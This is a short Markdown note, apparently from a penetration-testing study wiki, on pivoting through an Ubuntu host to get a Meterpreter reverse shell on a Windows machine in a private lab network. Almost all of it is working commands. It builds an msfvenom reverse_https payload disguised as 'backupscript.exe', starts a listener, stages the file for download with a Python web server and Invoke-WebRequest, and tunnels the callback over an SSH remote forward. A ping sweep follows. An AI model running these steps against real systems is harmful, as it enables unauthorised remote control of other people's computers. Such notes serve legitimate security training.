[[metasploit]]
# Example of getting reverse shell via pivot
attack host - 10.10.15.5
ubuntu        - 10.129.15.50, 172.16.5.129 (pivot host)
windows A  - 172.16.5.19                         (RDP host)
## Create payload
```bash
attacker$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
## Start multi handler (listener)
```msf
attacker$ msfconsole

msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```
## Upload payload
```bash
attacker$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

```bash
ubuntu$ python3 -m http.server 8123
```

```powershell
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

```bash
attacker$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```
Now execute payload on windows host and you'll get reverse shell in meterpreter.

## Discover hosts in network
```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```